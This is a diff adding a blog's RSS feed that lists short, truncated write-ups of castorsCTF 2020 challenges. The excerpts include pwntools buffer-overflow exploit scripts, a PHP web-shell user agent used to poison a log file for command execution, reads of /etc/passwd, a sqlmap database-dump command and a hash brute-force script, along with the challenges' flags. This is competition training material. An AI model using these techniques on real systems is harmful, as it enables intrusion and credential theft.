@@ -1,0 +1,231 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>writeup on Blog</title>
+    <link>/tags/writeup/</link>
+    <description>Recent content in writeup on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Ahmed Selim Üzüm</copyright>
+    
+	<atom:link href="/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>abcbof</title>
+      <link>/writups/castorsctf20/abcbof/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/abcbof/</guid>
+      <description>The executable file wants a password from us. So let&amp;rsquo;s see if it uses strcmp for comparing it. If that, and the text isn&amp;rsquo;t encyripted we should able to see the password. So let&amp;rsquo;s run ltrace ./abcbof and give aaaa for password. Here is the password! But when we tried it, it didn&amp;rsquo;t work.
+We can use ghidra for seeing why it didn&amp;rsquo;t work.
+undefined8 main(void) { int iVar1; char local_118 [256]; char local_18 [16]; printf(&amp;#34;Hello everyone, say your name: &amp;#34;); gets(local_118); iVar1 = strcmp(&amp;#34;CyberCastors&amp;#34;,local_18); if (iVar1 == 0) { get_flag(); } puts(&amp;#34;You lose!</description>
+    </item>
+    
+    <item>
+      <title>Arithmetics</title>
+      <link>/writups/castorsctf20/arithmetics/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/arithmetics/</guid>
+      <description>When we connect to the server, we can see we have to answer a lot of questions. So that let&amp;rsquo;s write a script!
+from pwn import * conn = remote(&amp;#34;chals20.cybercastors.com&amp;#34;,14429) conn.recvuntil(&amp;#34;&amp;lt;&amp;#34;) conn.recvuntil(&amp;#34;\n&amp;#34;) conn.send(&amp;#34;\n&amp;#34;) sayilar = {&amp;#34;one&amp;#34;:1, &amp;#34;two&amp;#34;:2, &amp;#34;three&amp;#34;:3, &amp;#34;four&amp;#34;:4, &amp;#34;five&amp;#34;:5, &amp;#34;six&amp;#34;:6, &amp;#34;seven&amp;#34;:7, &amp;#34;eight&amp;#34;:8, &amp;#34;nine&amp;#34;:9, &amp;#34;zero&amp;#34;:0} while True: try: soru = conn.recvline() print(soru) soru = str(soru).split(&amp;#34; &amp;#34;) try: sayi1 = int(soru[2]) except: sayi1 = sayilar[soru[2]] try: sayi2 = int(soru[4]) except: sayi2 = sayilar[soru[4]] if soru[3] == &amp;#39;+&amp;#39; or soru[3] == &amp;#34;plus&amp;#34;: islem = &amp;#34;+&amp;#34; sonuc = sayi1 + sayi2 elif soru[3] == &amp;#39;-&amp;#39; or soru[3] == &amp;#34;minus&amp;#34;: islem = &amp;#34;-&amp;#34; sonuc = sayi1 - sayi2 elif soru[3] == &amp;#39;*&amp;#39; or soru[3] == &amp;#34;multiplied-by&amp;#34;: islem = &amp;#34;*&amp;#34; sonuc = sayi1 * sayi2 elif soru[3] == &amp;#39;//&amp;#39; or soru[3] == &amp;#34;divided-by&amp;#34;: islem = &amp;#34;/&amp;#34; sonuc = sayi1 // sayi2 conn.</description>
+    </item>
+    
+    <item>
+      <title>babybof1</title>
+      <link>/writups/castorsctf20/babybof1/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/babybof1/</guid>
+      <description>With radare2 we can see there is a get_flag function so let&amp;rsquo;s ROP it!
+from pwn import * flag_addr = 0x004006e7 p = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14425) p.recvuntil(&amp;#34;Babybof&amp;#34;) padding = &amp;#34;A&amp;#34; * cyclic_find(b&amp;#34;qaacraac&amp;#34;) print(padding + p64(flag_addr)) p.sendline(padding + p64(flag_addr)) p.interactive() Flag: castorsCTF{th4t&#39;s_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}</description>
+    </item>
+    
+    <item>
+      <title>babybof2</title>
+      <link>/writups/castorsctf20/babybof2/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/babybof2/</guid>
+      <description>With same strategy as babybof1 we can get the flag
+from pwn import * winnersLevel_addr = 0x08049196 param_1 = 0x182 #p = process(&amp;#34;./winners&amp;#34;) p = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14434) padding = &amp;#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;#34; payload = padding + p32(winnersLevel_addr) + &amp;#34;CCCC&amp;#34; + p32(param_1) p.sendline(payload) print(payload) p.interactive() Flag: castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}</description>
+    </item>
+    
+    <item>
+      <title>Bane Art</title>
+      <link>/writups/castorsctf20/bane_art/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/bane_art/</guid>
+      <description>When we inspect the site we can see it uses topic param for getting the topig. And it looks like it includes the topic file. But can we use it for LFI? YES! We can test it with setting topic to /etc/passwd.
+With changing our user agent to &amp;lt;?php system($_GET[&#39;cmd&#39;]);?&amp;gt; and reading /var/log/apache2/access.log file we can execute any command we want using CMD param. Then with setting CMD to ls -Rla we can see flag is inside /home/falg/flag/test/why/the/hassle/right/flag.</description>
+    </item>
+    
+    <item>
+      <title>Base Number</title>
+      <link>/writups/castorsctf20/base_runner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/base_runner/</guid>
+      <description>For getting the flag in this challenge we should first decode the given binary from binary, then octal, then hex and then base64.
+from pwn import * import base64 def decode(data): bin_decoded = &amp;#34;&amp;#34; for d in data.split(&amp;#34; &amp;#34;): binary = chr(int(d, 2)) bin_decoded += binary oct_decoded = &amp;#34;&amp;#34; for s in bin_decoded.split(&amp;#34; &amp;#34;): oct_decoded += str(chr(int(s, 8))) hex_decoded = &amp;#34;&amp;#34; for s in oct_decoded.split(&amp;#34; &amp;#34;): hex_decoded += str(chr(int(s, 16))) return base64.</description>
+    </item>
+    
+    <item>
+      <title>Car Lottery</title>
+      <link>/writups/castorsctf20/car_lottery/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/car_lottery/</guid>
+      <description>First, with changing our client cookie to 3123248 we can access winner page. Then we can see site is using id param for getting car types. And if we use a invalid car type and then send a invalid ID we get an SQL error!
+With that we can dump data (and crack) from SQL database using this command:
+sqlmap -u &amp;#34;http://web1.cybercastors.com:14435/search?id=&amp;#34; --method=POST --cookie=&amp;#34;client=3123248&amp;#34; --dump And we got some creds! For using them we can find the /dealer dir using gobuster.</description>
+    </item>
+    
+    <item>
+      <title>Father Taurus Kernel Import!</title>
+      <link>/writups/castorsctf20/father_taurus_kernel_import/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/father_taurus_kernel_import/</guid>
+      <description>When we mount the drive we can see there is a forensics tool inside it. Then when we use that to analyze the drive we can see some secret files. And by separeting secret files from it we can get the flag!
+Flag: castorsCTF{f0r3ns1cS_ls_ITs_0Wn_b0SS}</description>
+    </item>
+    
+    <item>
+      <title>Gif</title>
+      <link>/writups/castorsctf20/gif/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/gif/</guid>
+      <description>We can extract the numbers we see with convert -coalesce brocoli.gif gif.gif command.
+To extract numbers, there are a ton of tools out there, but I just used convert -coalesce chal.gif chal.png.
+Numbers: 15 13 7 19 15 6 21 14 14 25 12 15 12
+Then I used cyberchef for guessing which kind of cipher is it With adding _ to between words and wrapping it in flag format we should get the flag.</description>
+    </item>
+    
+    <item>
+      <title>Glitchity Glitch</title>
+      <link>/writups/castorsctf20/glitchity_glitch/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/glitchity_glitch/</guid>
+      <description>For getting the flag in this challenge we have to have lots of money. For this we can buy VPN, then sell it and because of the glitch we can sell it again and again! So let&amp;rsquo;s write a script for earning money.
+from pwn import * conn = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14432) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) conn.sendline(&amp;#34;6&amp;#34;) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) for i in range(1020): conn.sendline(&amp;#34;0&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) conn.sendline(&amp;#34;1&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) print(i) conn.interactive() Flag: castorsCTF{$imPl3_sTUph_3h?}</description>
+    </item>
+    
+    <item>
+      <title>Leftovers</title>
+      <link>/writups/castorsctf20/leftovers/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/leftovers/</guid>
+      <description>We can decode the packages using this code The packages are USB packages. So maybe it is a keyboard? We can find decoding information indside HID Usage Tables. So let&amp;rsquo;s decode it using python.
+from scapy.all import * newmap = { 0: &amp;#34;&amp;#34;, 2: &amp;#34;PostFail&amp;#34;, 4: &amp;#34;a&amp;#34;, 5: &amp;#34;b&amp;#34;, 6: &amp;#34;c&amp;#34;, 7: &amp;#34;d&amp;#34;, 8: &amp;#34;e&amp;#34;, 9: &amp;#34;f&amp;#34;, 10: &amp;#34;g&amp;#34;, 11: &amp;#34;h&amp;#34;, 12: &amp;#34;i&amp;#34;, 13: &amp;#34;j&amp;#34;, 14: &amp;#34;k&amp;#34;, 15: &amp;#34;l&amp;#34;, 16: &amp;#34;m&amp;#34;, 17: &amp;#34;n&amp;#34;, 18: &amp;#34;o&amp;#34;, 19: &amp;#34;p&amp;#34;, 20: &amp;#34;q&amp;#34;, 21: &amp;#34;r&amp;#34;, 22: &amp;#34;s&amp;#34;, 23: &amp;#34;t&amp;#34;, 24: &amp;#34;u&amp;#34;, 25: &amp;#34;v&amp;#34;, 26: &amp;#34;w&amp;#34;, 27: &amp;#34;x&amp;#34;, 28: &amp;#34;y&amp;#34;, 29: &amp;#34;z&amp;#34;, 30: &amp;#34;1&amp;#34;, 31: &amp;#34;2&amp;#34;, 32: &amp;#34;3&amp;#34;, 33: &amp;#34;4&amp;#34;, 34: &amp;#34;5&amp;#34;, 35: &amp;#34;6&amp;#34;, 36: &amp;#34;7&amp;#34;, 37: &amp;#34;8&amp;#34;, 38: &amp;#34;9&amp;#34;, 39: &amp;#34;0&amp;#34;, 40: &amp;#34;Enter&amp;#34;, 41: &amp;#34;esc&amp;#34;, 42: &amp;#34;del&amp;#34;, 43: &amp;#34;tab&amp;#34;, 44: &amp;#34; &amp;#34;, 45: &amp;#34;-&amp;#34;, 47: &amp;#34;{&amp;#34;, 48: &amp;#34;}&amp;#34;, 56: &amp;#34;/&amp;#34;, 57: &amp;#34;CapsLock&amp;#34;, 79: &amp;#34;RightArrow&amp;#34;, 80: &amp;#34;LetfArrow&amp;#34; } packets = rdpcap(&amp;#39;.</description>
+    </item>
+    
+    <item>
+      <title>Manipulation</title>
+      <link>/writups/castorsctf20/manipulation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/manipulation/</guid>
+      <description>We can see pooh.jpg is a hexdump of a file and we can reverse it using xxd -r pooh.jph pooh. And when we checked file type using file command get a data? Maybe there was no header? Let&amp;rsquo;s add one and open it! We got the flag!
+Flag: castorsCTF{H3r3_Is_y0uR_Fl4gg}</description>
+    </item>
+    
+    <item>
+      <title>Octopus</title>
+      <link>/writups/castorsctf20/octopus/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/octopus/</guid>
+      <description>First we can see there is base64 encoded data inside PEM certificate. When we decode it we get a executable file. Then with executing it we get some Portuguese text and base64 encoded flag!
+Flag: castorsCTF{Wh0_s41d_AnY7hlnG_B0uT_m4tH}</description>
+    </item>
+    
+    <item>
+      <title>Password Crack 1</title>
+      <link>/writups/castorsctf20/password_crack_1/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/password_crack_1/</guid>
+      <description>If we want to crack a hash we have to know what type is it. For that I used hashid and learned that the type of hash is md5. Then I used a website called crackstation for cracking md5 hash.
+And we should get the flag by wrapping the result of the hash in flag format
+Flag: castorsCTF{irocktoo}</description>
+    </item>
+    
+    <item>
+      <title>Password Crack 2</title>
+      <link>/writups/castorsctf20/password_crack_2/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/password_crack_2/</guid>
+      <description>We can get the flag using the same strategy as Password Crack 1 Challenge.
+Flag: castorsCTF{pi3141592653589}</description>
+    </item>
+    
+    <item>
+      <title>Password Crack 3</title>
+      <link>/writups/castorsctf20/password_crack_3/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/password_crack_3/</guid>
+      <description>This one is a bit more diffrent than other password crack challenges. We can&amp;rsquo;t crack it using normal rockyou wordlist becauese it is wrapped inside flag format. Bu we can try to brute force wrapping all the words inside rockyou. And for that we can use python.
+import hashlib flag_hash = &amp;#34;7adebe1e15c37e23ab25c40a317b76547a75ad84bf57b378520fd59b66dd9e12&amp;#34; flag_format = &amp;#34;castorsCTF{xxx}&amp;#34; enc = &amp;#39;latin-1&amp;#39; rockyou = open(&amp;lt;path_to_rockyou&amp;gt;, encoding=enc) for line in rockyou: rock = line.strip(&amp;#34;\n&amp;#34;) flag = flag_format.</description>
+    </item>
+    
+    <item>
+      <title>Quiz</title>
+      <link>/writups/castorsctf20/quiz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/quiz/</guid>
+      <description>It looks like there is some math problems in here. Let&amp;rsquo;s use gobuster for finding is there anything else. We found backup! And ther is an interesting function called super which prints a file. So let&amp;rsquo;s print the flag. But where could it be? maybe inside /home/$USER/flag.txt? Let&amp;rsquo;s try it. We know the user is jeff from challenge description. Let&amp;rsquo;s send a request to http://web1.cybercastors.com:14436/test/home/jeff/flag.txt And we got the flag!</description>
+    </item>
+    
+    <item>
+      <title>Reverse-me</title>
+      <link>/writups/castorsctf20/reverse-me/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/reverse-me/</guid>
+      <description>It looks like we can get flag but it is encoded. Normally, I should have reversed the binary and find how it encode the flag and the decode it and get the flag. But I first tested all printable chars and get the corresponding encoded byte. Then with that, I matched all encoded bytes to corresponding char and got the flag
+Flag: castorsCTF{r3v3r51n6_15_fun}</description>
+    </item>
+    
+    <item>
+      <title>Shortcuts</title>
+      <link>/writups/castorsctf20/shortcuts/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/shortcuts/</guid>
+      <description>First, let&amp;rsquo;s try to upload a go file.
+exit status 1Sorry there doesn&#39;t seem to be a cat.go.go file So it means we need to remove .go extension? Let&amp;rsquo;s upload another one without extension. Yep! It worked. But for that there needs to be one with extension and one without.
+So if we can execute go file let&amp;rsquo;s execute ls -Rla with go and find the interesting files.
+package main import ( &amp;#34;fmt&amp;#34; &amp;#34;os/exec&amp;#34; ) func main() { cmd := exec.</description>
+    </item>
+    
+    <item>
+      <title>Stack</title>
+      <link>/writups/castorsctf20/stack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/stack/</guid>
+      <description>First we should inspect the binary id radare2
+λ › r2 -d stacking [0x7fe5bbd5b100]&amp;gt; aaa [0x7fe5bbd5b100]&amp;gt; afl [0x7fe5bbd5b100]&amp;gt; s main [0x5630d16b870a]&amp;gt; pdf ; DATA XREF from entry0 @ 0x5630d16b861d ┌ 32: int main (int argc, char **argv, char **envp); │ ; var int64_t var_10h @ rbp-0x10 │ ; var int64_t var_4h @ rbp-0x4 │ ; arg int argc @ rdi │ ; arg char **argv @ rsi │ 0x5630d16b870a 55 push rbp │ 0x5630d16b870b 4889e5 mov rbp, rsp │ 0x5630d16b870e 4883ec10 sub rsp, 0x10 │ 0x5630d16b8712 897dfc mov dword [var_4h], edi ; argc │ 0x5630d16b8715 488975f0 mov qword [var_10h], rsi ; argv │ 0x5630d16b8719 b800000000 mov eax, 0 │ 0x5630d16b871e e807000000 call sym.</description>
+    </item>
+    
+    <item>
+      <title>Vault 0</title>
+      <link>/writups/castorsctf20/vault0/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/vault0/</guid>
+      <description>We can see the checkpass() function first converts string to hex and then checks the values by hardcoded flag. We can easily get the flag by formatting the hardcoded values and then converting them to string with python.
+_input = [0x63, 0x61, 0x73, 0x74, 0x6f, 0x72, 0x73, 0x43, 0x54, 0x46, 0x7b, 0x72, 0x31, 0x78, 0x54, 0x79, 0x5f, 0x6d, 0x31, 0x6e, 0x75, 0x74, 0x33, 0x73, 0x5f, 0x67, 0x74, 0x5f, 0x73, 0x31, 0x78, 0x74, 0x79, 0x5f, 0x6d, 0x31, 0x6e, 0x75, 0x74, 0x33, 0x73, 0x7d] for i in _input: print(chr(i), end=&amp;#34;&amp;#34;) Flag: castorsCTF{r1xTy_m1nut3s_gt_s1xty_m1nut3s}</description>
+    </item>
+    
+  </channel>
+</rss>
